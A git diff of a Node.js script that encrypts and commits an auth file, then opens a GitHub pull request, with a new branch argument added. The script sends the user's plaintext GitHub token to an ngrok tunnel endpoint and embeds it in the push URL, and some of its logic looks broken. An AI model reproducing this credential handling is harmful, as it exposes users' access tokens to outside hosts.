@@ -3,7 +3,7 @@ const shell = require("shelljs")
 const axios = require("axios");
 const Octokit = require("@octokit/rest");
 
-async function encrypt(repo, pass) {
+async function encrypt(repo, pass, branch) {
     const algorithm = 'aes256';
     try {
         var cipher = crypto.createCipher(algorithm, pass)
@@ -21,52 +21,55 @@ async function encrypt(repo, pass) {
         shell.exec(`git commit -m 'add auth file'`)
         shell.exec(`git push https://${ owner }:${ pass }@github.com/${ repo } master`)
 
-        await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
+        let re = await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
             username: owner,
             gitToken: pass,
             repo: _repo,
             path: `auth.enc?ref=master`
         });
+        if (re.result) {
+            let resp = await axios.get(
+                `https://api.github.com/repos/${repo}/contents/auth.enc`
+            )
 
-        let resp = await axios.get(
-            `https://api.github.com/repos/${repo}/contents/auth.enc`
-        )
+            let cnt = resp.data.content;
+            let content = Buffer.from(cnt, 'base64').toString('ascii');
+            content = content.replace(/\n/g, "")
 
-        let cnt = resp.data.content;
-        let content = Buffer.from(cnt, 'base64').toString('ascii');
-        content = content.replace(/\n/g, "")
+            var decipher = crypto.createDecipher(algorithm, pass)
+            var dec = decipher.update(content, 'hex', 'utf8')
+            dec += decipher.final('utf8');
 
-        var decipher = crypto.createDecipher(algorithm, pass)
-        var dec = decipher.update(content, 'hex', 'utf8')
-        dec += decipher.final('utf8');
+            let token = dec;
 
-        let token = dec;
-        
-        let octokit = new Octokit({
-            auth: "token " + token
-        });
+            let octokit = new Octokit({
+                auth: "token " + token
+            });
 
-        await octokit.pulls.create({
-            owner,
-            repo,
-            head,
-            base,
-            title,
-            body
-        })
-        
-        console.log("DONE");
+            await octokit.pulls.create({
+                owner,
+                repo,
+                head: `${owner}:${branch}`,
+                base: branch,
+                title: branch,
+                body: "Please pull new changes in"
+            })
 
-        return true
+            console.log("DONE");
+
+            return true
+        }
+        return false
+
     } catch (err) {
         throw err
     }
 }
 
-const a = async (repo, gitToken) => {
-    return await encrypt(repo, gitToken)
+const a = async (repo, gitToken, branch) => {
+    return await encrypt(repo, gitToken, branch)
 }
 
-a(process.argv[2], process.argv[3]).then((res) => {
+a(process.argv[2], process.argv[3], process.argv[4]).then((res) => {
     console.log(res)
 })
